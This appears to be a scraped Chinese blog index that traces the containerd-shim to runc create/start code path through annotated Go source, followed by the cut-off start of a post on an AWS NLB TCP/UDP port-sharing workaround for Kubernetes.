sopts)实现的地方 123func (c *local) Create(ctx context.Context, in *shimapi.CreateTaskRequest) (*shimapi.CreateTaskResponse, error) &#123;\treturn c.s.Create(ctx, in)... create 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// Create a new initial process and container with the underlying OCI runtimefunc (s *Service) Create(ctx context.Context, r *shimapi.CreateTaskRequest) (_ *shimapi.CreateTaskResponse, err error) &#123;\tvar mounts []proc.Mount\tfor _, m := range r.Rootfs &#123; mounts = append(mounts, proc.Mount&#123; Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, &#125;)\t&#125;\tconfig := &amp;proc.CreateConfig&#123; ID: r.ID, Bundle: r.Bundle, Runtime: r.Runtime, Rootfs: mounts, Terminal: r.Terminal, Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Checkpoint: r.Checkpoint, ParentCheckpoint: r.ParentCheckpoint, Options: r.Options,\t&#125;\trootfs := filepath.Join(r.Bundle, &quot;rootfs&quot;)\tdefer func(rootfs string) &#123; if err != nil &#123; if err2 := mount.UnmountAll(rootfs, 0); err2 != nil &#123; log.G(ctx).WithError(err2).Warn(&quot;Failed to cleanup rootfs mount&quot;) &#125; &#125;\t&#125;(rootfs)\tfor _, rm := range mounts &#123; m := &amp;mount.Mount&#123; Type: rm.Type, Source: rm.Source, Options: rm.Options, &#125; if err := m.Mount(rootfs); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to mount rootfs component %v&quot;, m) &#125;\t&#125;\ts.mu.Lock()\tdefer s.mu.Unlock()\tif len(mounts) == 0 &#123; rootfs = &quot;&quot;\t&#125;\tprocess, err := newInit( ctx, s.config.Path, s.config.WorkDir, s.config.RuntimeRoot, s.config.Namespace, s.config.Criu, s.config.SystemdCgroup, s.platform, config, rootfs,\t)\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\tif err := process.Create(ctx, config); err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\t// save the main task id and bundle to the shim for additional requests\ts.id = r.ID\ts.bundle = r.Bundle\tpid := process.Pid()\ts.processes[r.ID] = process\treturn &amp;shimapi.CreateTaskResponse&#123; Pid: uint32(pid),\t&#125;, nil&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// Create the process with the provided configfunc (p *Init) Create(ctx context.Context, r *CreateConfig) error &#123;\tvar ( err error socket *runc.Socket\t)\tif r.Terminal &#123; if socket, err = runc.NewTempConsoleSocket(); err != nil &#123; return errors.Wrap(err, &quot;failed to create OCI runtime console socket&quot;) &#125; defer socket.Close()\t&#125; else if hasNoIO(r) &#123; if p.io, err = runc.NewNullIO(); err != nil &#123; return errors.Wrap(err, &quot;creating new NULL IO&quot;) &#125;\t&#125; else &#123; if p.io, err = runc.NewPipeIO(p.IoUID, p.IoGID, withConditionalIO(p.stdio)); err != nil &#123; return errors.Wrap(err, &quot;failed to create OCI runtime io pipes&quot;) &#125;\t&#125;\tpidFile := filepath.Join(p.Bundle, InitPidFile)\tif r.Checkpoint != &quot;&quot; &#123; opts := &amp;runc.RestoreOpts&#123; CheckpointOpts: runc.CheckpointOpts&#123; ImagePath: r.Checkpoint, WorkDir: p.WorkDir, ParentPath: r.ParentCheckpoint, &#125;, PidFile: pidFile, IO: p.io, NoPivot: p.NoPivotRoot, Detach: true, NoSubreaper: true, &#125; p.initState = &amp;createdCheckpointState&#123; p: p, opts: opts, &#125; return nil\t&#125;\topts := &amp;runc.CreateOpts&#123; PidFile: pidFile, IO: p.io, NoPivot: p.NoPivotRoot, NoNewKeyring: p.NoNewKeyring,\t&#125;\tif socket != nil &#123; opts.ConsoleSocket = socket\t&#125;\tif err := p.runtime.Create(ctx, r.ID, r.Bundle, opts); err != nil &#123; return p.runtimeError(err, &quot;OCI runtime create failed&quot;)\t&#125;\tif r.Stdin != &quot;&quot; &#123; sc, err := fifo.OpenFifo(context.Background(), r.Stdin, syscall.O_WRONLY|syscall.O_NONBLOCK, 0) if err != nil &#123; return errors.Wrapf(err, &quot;failed to open stdin fifo %s&quot;, r.Stdin) &#125; p.stdin = sc p.closers = append(p.closers, sc)\t&#125;\tvar copyWaitGroup sync.WaitGroup\tctx, cancel := context.WithTimeout(ctx, 30*time.Second)\tdefer cancel()\tif socket != nil &#123; console, err := socket.ReceiveMaster() if err != nil &#123; return errors.Wrap(err, &quot;failed to retrieve console master&quot;) &#125; console, err = p.Platform.CopyConsole(ctx, console, r.Stdin, r.Stdout, r.Stderr, &amp;p.wg, &amp;copyWaitGroup) if err != nil &#123; return errors.Wrap(err, &quot;failed to start console copy&quot;) &#125; p.console = console\t&#125; else if !hasNoIO(r) &#123; if err := copyPipes(ctx, p.io, r.Stdin, r.Stdout, r.Stderr, &amp;p.wg, &amp;copyWaitGroup); err != nil &#123; return errors.Wrap(err, &quot;failed to start io pipe copy&quot;) &#125;\t&#125;\tcopyWaitGroup.Wait()\tpid, err := runc.ReadPidFile(pidFile)\tif err != nil &#123; return errors.Wrap(err, &quot;failed to retrieve OCI runtime container pid&quot;)\t&#125;\tp.pid = pid\treturn nil&#125; 123456789101112131415161718192021222324// Create creates a new container and returns its pid if it was created successfullyfunc (r *Runc) Create(context context.Context, id, bundle string, opts *CreateOpts) error &#123;\targs := []string&#123;&quot;create&quot;, &quot;--bundle&quot;, bundle&#125; // 这里就是 runc create --bundle 的命令行了\tif opts != nil &#123; oargs, err := opts.args() if err != nil &#123; return err &#125; args = append(args, oargs...)\t&#125;\tcmd := r.command(context, append(args, id)...)\tif opts != nil &amp;&amp; opts.IO != nil &#123; opts.Set(cmd)\t&#125;\tcmd.ExtraFiles = opts.ExtraFiles\tif cmd.Stdout == nil &amp;&amp; cmd.Stderr == nil &#123; data, err := cmdOutput(cmd, true) if err != nil &#123; return fmt.Errorf(&quot;%s: %s&quot;, err, data) &#125; return nil\t&#125;... contained-shim start基于 containerd 的分析其实还看到调用 t.shim.Start(ctx, &amp;shim.StartRequest&#123;ID: t.id&#125;) 12func (c *local) Start(ctx context.Context, in *shimapi.StartRequest) (*shimapi.StartResponse, error) &#123; return c.s.Start(ctx, in) 12345678910111213// Start a processfunc (s *Service) Start(ctx context.Context, r *shimapi.StartRequest) (*shimapi.StartResponse, error) &#123; p, err := s.getExecProcess(r.ID) // get exec process if err != nil &#123; return nil, err &#125; if err := p.Start(ctx); err != nil &#123; return nil, err &#125; return &amp;shimapi.StartResponse&#123; ID: p.ID(), Pid: uint32(p.Pid()), &#125;, nil 12345func (e *execProcess) Start(ctx context.Context) error &#123; e.mu.Lock() defer e.mu.Unlock() return e.execState.Start(ctx) // execState 这会应该是 created，因为前面已经 runc create --bundle 了 12func (s *createdState) Start(ctx context.Context) error &#123;\tif err := s.p.start(ctx); err != nil &#123; 12func (p *Init) start(ctx context.Context) error &#123;\terr := p.runtime.Start(ctx, p.id) 1234// Start will start an already created containerfunc (r *Runc) Start(context context.Context, id string) error &#123; return r.runOrError(r.command(context, &quot;start&quot;, id)) // 这里会运行，r.command 返回的 exec.Cmd object &#125; 12345678910111213141516func (r *Runc) command(context context.Context, args ...string) *exec.Cmd &#123; command := r.Command if command == &quot;&quot; &#123; command = DefaultCommand // DefaultCommand = &quot;runc&quot; &#125; cmd := exec.CommandContext(context, command, append(r.args(), args...)...) cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Setpgid: r.Setpgid, &#125; cmd.Env = filterEnv(os.Environ(), &quot;NOTIFY_SOCKET&quot;) // NOTIFY_SOCKET introduces a special behavior in runc but should only be set if invoked from systemd if r.PdeathSignal != 0 &#123; cmd.SysProcAttr.Pdeathsig = r.PdeathSignal &#125; return cmd&#125; 那么其实到这里也就看完了 containrd-shim 调用 runc create &#x2F; runc start runc前面看过了 containerd-shim 调用了 runc create 与 runc start，这里梳理一下 runc 的相关代码逻辑。 run create –bundle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) &#123;\tid := context.Args().First()\tif id == &quot;&quot; &#123; return -1, errEmptyID\t&#125;\tnotifySocket := newNotifySocket(context, os.Getenv(&quot;NOTIFY_SOCKET&quot;), id)\tif notifySocket != nil &#123; notifySocket.setupSpec(context, spec)\t&#125;\tcontainer, err := createContainer(context, id, spec) // 准备 container 在 runc 内存中的 object\tif err != nil &#123; return -1, err\t&#125;\tif notifySocket != nil &#123; err := notifySocket.setupSocket() if err != nil &#123; return -1, err &#125;\t&#125;\t// Support on-demand socket activation by passing file descriptors into the container init process.\tlistenFDs := []*os.File&#123;&#125;\tif os.Getenv(&quot;LISTEN_FDS&quot;) != &quot;&quot; &#123; listenFDs = activation.Files(false)\t&#125;\tlogLevel := &quot;info&quot;\tif context.GlobalBool(&quot;debug&quot;) &#123; logLevel = &quot;debug&quot;\t&#125;\tr := &amp;runner&#123; enableSubreaper: !context.Bool(&quot;no-subreaper&quot;), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(&quot;console-socket&quot;), detach: context.Bool(&quot;detach&quot;), pidFile: context.String(&quot;pid-file&quot;), preserveFDs: context.Int(&quot;preserve-fds&quot;), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel,\t&#125;\treturn r.run(spec.Process) // run&#125; 调用 createContainer创建 cotnainer 对象，实际的创建由平台相关的工厂函数实现 1234567891011121314151617181920212223func createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) &#123;\trootlessCg, err := shouldUseRootlessCgroupManager(context)\tif err != nil &#123; return nil, err\t&#125;\tconfig, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123; CgroupName: id, UseSystemdCgroup: context.GlobalBool(&quot;systemd-cgroup&quot;), NoPivotRoot: context.Bool(&quot;no-pivot&quot;), NoNewKeyring: context.Bool(&quot;no-new-keyring&quot;), Spec: spec, RootlessEUID: os.Geteuid() != 0, RootlessCgroups: rootlessCg,\t&#125;)\tif err != nil &#123; return nil, err\t&#125;\tfactory, err := loadFactory(context) // 返回 Linux 的实现 InitPath 字段为 /proc/self/exe，InitArgs 字段为 []string&#123;os.Args[0], &quot;init&quot;&#125;,\tif err != nil &#123; return nil, err\t&#125;\treturn factory.Create(id, config) factory.Create 创建返回一个 container结构体，其中 container 结构体 1234567891011c := &amp;linuxContainer&#123;\tid: id,\troot: containerRoot, //这里是 cotnainer 的 root 目录\tconfig: config, initPath: l.InitPath, // init path /proc/self/exe\tinitArgs: l.InitArgs, // []string&#123;os.Args[0].&#125;\tcriuPath: l.CriuPath,\tnewuidmapPath: l.NewuidmapPath,\tnewgidmapPath: l.NewgidmapPath,\tcgroupManager: l.NewCgroupsManager(config.Cgroups, nil),&#125; 返回上述结构体，继续回到到上层代码继续执行到r.run(spec.Process) 123456789101112func (r *runner) run(config *specs.Process) (int, error) &#123;...\tprocess, err := newProcess(*config, r.init, r.logLevel)\tif err != nil &#123; return -1, err\t&#125;....\tswitch r.action &#123;\tcase CT_ACT_CREATE: err = r.container.Start(process) // 这次行为会到这个流程.... 回到 r.container.Start(process) 继续执行 12345678910111213141516func (c *linuxContainer) Start(process *Process) error &#123;\tc.m.Lock()\tdefer c.m.Unlock()\tif process.Init &#123; // 使用 create 这里就是 true if err := c.createExecFifo(); err != nil &#123; // create 一个 exec.fifo 用与进程间通信，只有写时会被阻塞，读写都在时才会正常运行 return err &#125;\t&#125;\tif err := c.start(process); err != nil &#123; // 这才是本次关注点 if process.Init &#123; c.deleteExecFifo() &#125; return err\t&#125;\treturn nil&#125; c.start(process)的实现 123456789func (c *linuxContainer) start(process *Process) error &#123;\tparent, err := c.newParentProcess(process) // 创建父进程，代码在下面 review\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;creating new parent process&quot;)\t&#125;\tparent.forwardChildLogs()\tif err := parent.start(); err != nil &#123; // 这里创建父进程的 start，其实也就是 runc init // terminate the process to ensure that it properly is reaped.... newParentProcess()其实就是命令行为 runc init 的 parentProcess，返回给上面调用parent.start()。 12345678910111213141516171819202122232425262728293031func (c *linuxContainer) newParentProcess(p *Process) (parentProcess, error) &#123;\tparentInitPipe, childInitPipe, err := utils.NewSockPair(&quot;init&quot;)\tif err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;creating new init pipe&quot;)\t&#125;\tmessageSockPair := filePair&#123;parentInitPipe, childInitPipe&#125;\tparentLogPipe, childLogPipe, err := os.Pipe()\tif err != nil &#123; return nil, fmt.Errorf(&quot;Unable to create the log pipe: %s&quot;, err)\t&#125;\tlogFilePair := filePair&#123;parentLogPipe, childLogPipe&#125;\tcmd, err := c.commandTemplate(p, childInitPipe, childLogPipe) // 准备命令行 if err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;creating new command template&quot;)\t&#125;\tif !p.Init &#123; return c.newSetnsProcess(p, cmd, messageSockPair, logFilePair) // 如果不是 init，所以这一次不关心这里\t&#125;\t// We only set up fifoFd if we&#x27;re not doing a `runc exec`. The historic\t// reason for this is that previously we would pass a dirfd that allowed\t// for container rootfs escape (and not doing it in `runc exec` avoided\t// that problem), but we no longer do that. However, there&#x27;s no need to do\t// this for `runc exec` so we just keep it this way to be safe.\tif err := c.includeExecFifo(cmd); err != nil &#123; return nil, newSystemErrorWithCause(err, &quot;including execfifo in cmd.Exec setup&quot;)\t&#125;\treturn c.newInitProcess(p, cmd, messageSockPair, logFilePair) // 返回 initProcess，其中 cmd 为 runc init，并 c.initProcess = init&#125; parent.start() 就是实际开始运行 runc init了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183func (p *initProcess) start() error &#123;\tdefer p.messageSockPair.parent.Close()\terr := p.cmd.Start() // 启动 runc init\tp.process.ops = p\t// close the write-side of the pipes (controlled by child)\tp.messageSockPair.child.Close()\tp.logFilePair.child.Close()\tif err != nil &#123; p.process.ops = nil return newSystemErrorWithCause(err, &quot;starting init process command&quot;)\t&#125;\t// Do this before syncing with child so that no children can escape the\t// cgroup. We don&#x27;t need to worry about not doing this and not being root\t// because we&#x27;d be using the rootless cgroup manager in that case.\tif err := p.manager.Apply(p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying cgroup configuration for process&quot;)\t&#125;\tif p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Apply(p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying Intel RDT configuration for process&quot;) &#125;\t&#125;\tdefer func() &#123; if err != nil &#123; // TODO: should not be the responsibility to call here p.manager.Destroy() if p.intelRdtManager != nil &#123; p.intelRdtManager.Destroy() &#125; &#125;\t&#125;()\tif _, err := io.Copy(p.messageSockPair.parent, p.bootstrapData); err != nil &#123; return newSystemErrorWithCause(err, &quot;copying bootstrap data to pipe&quot;)\t&#125;\tchildPid, err := p.getChildPid() // 获取 child 的 pid\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;getting the final child&#x27;s pid from pipe&quot;)\t&#125;\t// Save the standard descriptor names before the container process\t// can potentially move them (e.g., via dup2()). If we don&#x27;t do this now,\t// we won&#x27;t know at checkpoint time which file descriptor to look up.\tfds, err := getPipeFds(childPid)\tif err != nil &#123; return newSystemErrorWithCausef(err, &quot;getting pipe fds for pid %d&quot;, childPid)\t&#125;\tp.setExternalDescriptors(fds)\t// Do this before syncing with child so that no children\t// can escape the cgroup\tif err := p.manager.Apply(childPid); err != nil &#123; // 这里设置调用具体的实现配置 cgroup return newSystemErrorWithCause(err, &quot;applying cgroup configuration for process&quot;)\t&#125;\tif p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Apply(childPid); err != nil &#123; return newSystemErrorWithCause(err, &quot;applying Intel RDT configuration for process&quot;) &#125;\t&#125;\t// Now it&#x27;s time to setup cgroup namesapce\tif p.config.Config.Namespaces.Contains(configs.NEWCGROUP) &amp;&amp; p.config.Config.Namespaces.PathOf(configs.NEWCGROUP) == &quot;&quot; &#123; if _, err := p.messageSockPair.parent.Write([]byte&#123;createCgroupns&#125;); err != nil &#123; return newSystemErrorWithCause(err, &quot;sending synchronization value to init process&quot;) &#125;\t&#125;\t// Wait for our first child to exit\tif err := p.waitForChildExit(childPid); err != nil &#123; return newSystemErrorWithCause(err, &quot;waiting for our first child to exit&quot;)\t&#125;\tdefer func() &#123; if err != nil &#123; // TODO: should not be the responsibility to call here p.manager.Destroy() if p.intelRdtManager != nil &#123; p.intelRdtManager.Destroy() &#125; &#125;\t&#125;()\tif err := p.createNetworkInterfaces(); err != nil &#123; // 创建网络接口 return newSystemErrorWithCause(err, &quot;creating network interfaces&quot;)\t&#125;\tif err := p.sendConfig(); err != nil &#123; // 把配置发送给子进程 return newSystemErrorWithCause(err, &quot;sending config to init process&quot;)\t&#125;\tvar ( sentRun bool sentResume bool\t)\tierr := parseSync(p.messageSockPair.parent, func(sync *syncT) error &#123; switch sync.Type &#123; case procReady: // set rlimits, this has to be done here because we lose permissions // to raise the limits once we enter a user-namespace if err := setupRlimits(p.config.Rlimits, p.pid()); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting rlimits for ready process&quot;) &#125; // call prestart hooks if !p.config.Config.Namespaces.Contains(configs.NEWNS) &#123; // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. if err := p.manager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting cgroup config for ready process&quot;) &#125; if p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting Intel RDT config for ready process&quot;) &#125; &#125; if p.config.Config.Hooks != nil &#123; s, err := p.container.currentOCIState() if err != nil &#123; return err &#125; // initProcessStartTime hasn&#x27;t been set yet. s.Pid = p.cmd.Process.Pid s.Status = &quot;creating&quot; for i, hook := range p.config.Config.Hooks.Prestart &#123; if err := hook.Run(s); err != nil &#123; return newSystemErrorWithCausef(err, &quot;running prestart hook %d&quot;, i) &#125; &#125; &#125; &#125; // Sync with child. if err := writeSync(p.messageSockPair.parent, procRun); err != nil &#123; return newSystemErrorWithCause(err, &quot;writing syncT &#x27;run&#x27;&quot;) &#125; sentRun = true case procHooks: // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. if err := p.manager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting cgroup config for procHooks process&quot;) &#125; if p.intelRdtManager != nil &#123; if err := p.intelRdtManager.Set(p.config.Config); err != nil &#123; return newSystemErrorWithCause(err, &quot;setting Intel RDT config for procHooks process&quot;) &#125; &#125; if p.config.Config.Hooks != nil &#123; s, err := p.container.currentOCIState() if err != nil &#123; return err &#125; // initProcessStartTime hasn&#x27;t been set yet. s.Pid = p.cmd.Process.Pid s.Status = &quot;creating&quot; for i, hook := range p.config.Config.Hooks.Prestart &#123; if err := hook.Run(s); err != nil &#123; return newSystemErrorWithCausef(err, &quot;running prestart hook %d&quot;, i) &#125; &#125; &#125; // Sync with child. if err := writeSync(p.messageSockPair.parent, procResume); err != nil &#123; return newSystemErrorWithCause(err, &quot;writing syncT &#x27;resume&#x27;&quot;) &#125; sentResume = true default: return newSystemError(fmt.Errorf(&quot;invalid JSON payload from child&quot;)) &#125; return nil\t&#125;)\tif !sentRun &#123; return newSystemErrorWithCause(ierr, &quot;container init&quot;)\t&#125;\tif p.config.Config.Namespaces.Contains(configs.NEWNS) &amp;&amp; !sentResume &#123; return newSystemError(fmt.Errorf(&quot;could not synchronise after executing prestart hooks with container process&quot;))\t&#125;\tif err := unix.Shutdown(int(p.messageSockPair.parent.Fd()), unix.SHUT_WR); err != nil &#123; return newSystemErrorWithCause(err, &quot;shutting down init pipe&quot;)\t&#125;\t// Must be done after Shutdown so the child will exit and we can wait for it.\tif ierr != nil &#123; p.wait() return ierr\t&#125;\treturn nil&#125; 运行到这里也就是 runc create 要返回了，但是子进程的 runc init 因为父进程的退出被 1 号进程接管。 runc init这个就是 contianer 启动的时候swap前的进程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state// This is a low level implementation detail of the reexec and should not be consumed externallyfunc (l *LinuxFactory) StartInitialization() (err error) &#123;\tvar ( pipefd, fifofd int consoleSocket *os.File envInitPipe = os.Getenv(&quot;_LIBCONTAINER_INITPIPE&quot;) envFifoFd = os.Getenv(&quot;_LIBCONTAINER_FIFOFD&quot;) envConsole = os.Getenv(&quot;_LIBCONTAINER_CONSOLE&quot;)\t)\t// Get the INITPIPE.\tpipefd, err = strconv.Atoi(envInitPipe)\tif err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_INITPIPE=%s to int: %s&quot;, envInitPipe, err)\t&#125;\tvar ( pipe = os.NewFile(uintptr(pipefd), &quot;pipe&quot;) it = initType(os.Getenv(&quot;_LIBCONTAINER_INITTYPE&quot;))\t)\tdefer pipe.Close()\t// Only init processes have FIFOFD.\tfifofd = -1\tif it == initStandard &#123; if fifofd, err = strconv.Atoi(envFifoFd); err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_FIFOFD=%s to int: %s&quot;, envFifoFd, err) &#125;\t&#125;\tif envConsole != &quot;&quot; &#123; console, err := strconv.Atoi(envConsole) if err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_CONSOLE=%s to int: %s&quot;, envConsole, err) &#125; consoleSocket = os.NewFile(uintptr(console), &quot;console-socket&quot;) defer consoleSocket.Close()\t&#125;\t// clear the current process&#x27;s environment to clean any libcontainer\t// specific env vars.\tos.Clearenv()\tdefer func() &#123; // We have an error during the initialization of the container&#x27;s init, // send it back to the parent process in the form of an initError. if werr := utils.WriteJSON(pipe, syncT&#123;procError&#125;); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125; if werr := utils.WriteJSON(pipe, newSystemError(err)); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125;\t&#125;()\tdefer func() &#123; if e := recover(); e != nil &#123; err = fmt.Errorf(&quot;panic from initialization: %v, %v&quot;, e, string(debug.Stack())) &#125;\t&#125;()\ti, err := newContainerInit(it, pipe, consoleSocket, fifofd)\tif err != nil &#123; return err\t&#125;\t// If Init succeeds, syscall.Exec will not return, hence none of the defers will be called.\treturn i.Init()&#125; newContainerInit()整体逻辑也比较简单 1234567891011121314151617181920212223242526func newContainerInit(t initType, pipe *os.File, consoleSocket *os.File, fifoFd int) (initer, error) &#123;\tvar config *initConfig\tif err := json.NewDecoder(pipe).Decode(&amp;config); err != nil &#123; return nil, err\t&#125;\tif err := populateProcessEnvironment(config.Env); err != nil &#123; return nil, err\t&#125;\tswitch t &#123;\tcase initSetns: return &amp;linuxSetnsInit&#123; pipe: pipe, consoleSocket: consoleSocket, config: config, &#125;, nil\tcase initStandard: return &amp;linuxStandardInit&#123; pipe: pipe, consoleSocket: consoleSocket, parentPid: unix.Getppid(), config: config, fifoFd: fifoFd, &#125;, nil\t&#125;\treturn nil, fmt.Errorf(&quot;unknown init type %q&quot;, t)&#125; 当你运行 runc crate 这个时候的 init 是调用就是 linuxStandardInit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061func (l *linuxStandardInit) Init() error &#123;\truntime.LockOSThread()\tdefer runtime.UnlockOSThread().... if err := setupNetwork(l.config); err != nil &#123; // 根据 config 使用 netlink 进行配置 return err\t&#125;\tif err := setupRoute(l.config.Config); err != nil &#123; // 使用 netlink 设置 route -\t// signal, so we restore it here.\tif err := pdeath.Restore(); err != nil &#123; return errors.Wrap(err, &quot;restore pdeath signal&quot;)\t&#125;\t// Compare the parent from the initial start of the init process and make\t// sure that it did not change. if the parent changes that means it died\t// and we were reparented to something else so we should just kill ourself\t// and not cause problems for someone else.\tif unix.Getppid() != l.parentPid &#123; return unix.Kill(unix.Getpid(), unix.SIGKILL)\t&#125;\t// Check for the arg before waiting to make sure it exists and it is\t// returned as a create time error.\tname, err := exec.LookPath(l.config.Args[0])\tif err != nil &#123; return err\t&#125;\t// Close the pipe to signal that we have completed our init.\tl.pipe.Close()\t// Wait for the FIFO to be opened on the other side before exec-ing the\t// user process. We open it through /proc/self/fd/$fd, because the fd that\t// was given to us was an O_PATH fd to the fifo itself. Linux allows us to\t// re-open an O_PATH fd through /proc. // 看一下注释，这里利用了 fifo 的特点，等待 runc start 来开这个 fifo\tfd, err := unix.Open(fmt.Sprintf(&quot;/proc/self/fd/%d&quot;, l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0) // 一起准备就绪过后他就会 hang 在这里\tif err != nil &#123; return newSystemErrorWithCause(err, &quot;open exec fifo&quot;)\t&#125;\tif _, err := unix.Write(fd, []byte(&quot;0&quot;)); err != nil &#123; // 当用户调用 runc start 打开 fifo，就会执行到这里 return newSystemErrorWithCause(err, &quot;write 0 exec fifo&quot;)\t&#125;\t// Close the O_PATH fifofd fd before exec because the kernel resets\t// dumpable in the wrong order. This has been fixed in newer kernels, but\t// we keep this to ensure CVE-2016-9962 doesn&#x27;t re-emerge on older kernels.\t// N.B. the core issue itself (passing dirfds to the host filesystem) has\t// since been resolved.\t// https://github.com/torvalds/linux/blob/v4.9/fs/exec.c#L1290-L1318\tunix.Close(l.fifoFd)\t// Set seccomp as close to execve as possible, so as few syscalls take\t// place afterward (reducing the amount of syscalls that users need to\t// enable in their seccomp profiles).\tif l.config.Config.Seccomp != nil &amp;&amp; l.config.NoNewPrivileges &#123; if err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil &#123; return newSystemErrorWithCause(err, &quot;init seccomp&quot;) &#125;\t&#125;\tif err := syscall.Exec(name, l.config.Args[0:], os.Environ()); err != nil &#123; // 这里 swap 用户的进程了 return newSystemErrorWithCause(err, &quot;exec user process&quot;)\t&#125;\treturn nil&#125; runc start其实 runc start 的逻辑更简单，仅仅是通过 fifo 和 runc init进程沟通，让他继续执行用户进程。 1234567891011121314var startCommand = cli.Command&#123;\tName: &quot;start&quot;,... container, err := getContainer(context) if err != nil &#123; return err &#125; status, err := container.Status() if err != nil &#123; return err &#125; switch status &#123; case libcontainer.Created: return container.Exec() 12345func (c *linuxContainer) Exec() error &#123;\tc.m.Lock()\tdefer c.m.Unlock()\treturn c.exec()&#125; 打开子进程的fifo.exec 文件，子进程就能继续执行下去了。 12345678910111213141516171819202122func (c *linuxContainer) exec() error &#123;\tpath := filepath.Join(c.root, execFifoFilename)\tpid := c.initProcess.pid()\tblockingFifoOpenCh := awaitFifoOpen(path)\tfor &#123; select &#123; case result := &lt;-blockingFifoOpenCh: return handleFifoResult(result) case &lt;-time.After(time.Millisecond * 100): stat, err := system.Stat(pid) if err != nil || stat.State == system.Zombie &#123; // could be because process started, ran, and completed between our 100ms timeout and our system.Stat() check. // see if the fifo exists and has data (with a non-blocking open, which will succeed if the writing process is complete). if err := handleFifoResult(fifoOpen(path, false)); err != nil &#123; return errors.New(&quot;container process is already dead&quot;) &#125; return nil &#125; &#125;\t&#125;&#125; 1234567891011func handleFifoResult(result openResult) error &#123;\tif result.err != nil &#123; return result.err\t&#125;\tf := result.file\tdefer f.Close()\tif err := readFromExecFifo(f); err != nil &#123; // return err\t&#125;\treturn os.Remove(f.Name())&#125; 12345678910func readFromExecFifo(execFifo io.Reader) error &#123;\tdata, err := ioutil.ReadAll(execFifo)\tif err != nil &#123; return err\t&#125;\tif len(data) &lt;= 0 &#123; return fmt.Errorf(&quot;cannot start an already running container&quot;)\t&#125;\treturn nil&#125; 打开 fifo，如果 data 小于 0 说明这个 fifo 里面 0 已经被读完了，也就是 running 的。 referencecontainer-runtime-interface-cri-in-kubernetes&#x2F;","tags":["k8s"]},{"title":"aws nlb 使用 full nat 遇到的 tcp rest 问题","path":"/2020/08/10/aws-nlb-full-nat/","content":"背景业务要使用 k8s service 将集群内部的业务暴露出来，对外提供 tcp&#x2F;udp 的接入方式，两个传输层的协议使用相同的端口号。 而我们在 aws 上自己建的集群使用的是 aws cloud provider 来实现和 aws 内部资源互联互通调用，而截止 20200810 aws cloud provider 还不支持创建 service 支持tcp&#x2F;udp使用同一个端口号。 如何绕过有了上面的背景，就准备设计方案绕过目前 aws cloud provider 实现的限制。 walk around 的方案是下面这样设计的： 使用 lb 将流量转发到节点上。 流量转发到节点上使用 iptables 将流量转发到 pod 中去。 那么围绕着上面的思路，就有 2 个核心问题。其一是确认使用的 lb 类型。其二是如何管理 iptables 规则将流量转发到节点上。 首先是 lb 类型选择的问题，首先排除 alb 因为只支持 http&#x2F;https，其次排除 clb 因为 cld 连 udp 都不支持，其实也就只能选择 nlb，因为 nlb 支持 tcp&#x2F;udp&#x2F;tcp_udp 等，至少我要的是有的。 第二个问题是如何将流量从节点上转发到 poc 里面，基于对 kubernetes service 理解，准备使用 node port 来实现。 那么上面这个 poc 的数据链路就是 client -&gt; nlb (listener) -&gt; targetgroup (instance &amp; tcp_udp)-&gt; node (iptables)-&gt; container。client 使用 nc 来模拟发送 tcp&#x2F;udp 数据包，nlb 配置没有特别注意的地方只是在创建 listener 的时候类型选择 tcp_udp，targetgroup 创建选择 instance 类型选择 tcp_udp，node 和 container 也没有特别的地方，就是普通的 kubernetes 节点运行着一个 pod 而已。 nlb 转发后使用 fullnat 的问题其实基于上面的设计，流量可以的转发到节点上。到了节点上可以使用 iptables 转发规则将流量转到 pod 中。 因为 tcp 和 udp 两个需要对外使用同一个端口，所以单纯使用 node port 将流量转发到 pod 中可能只转发一种协议。 因为使用手动下发 ipbtales 规则又不能 cover 到 pod 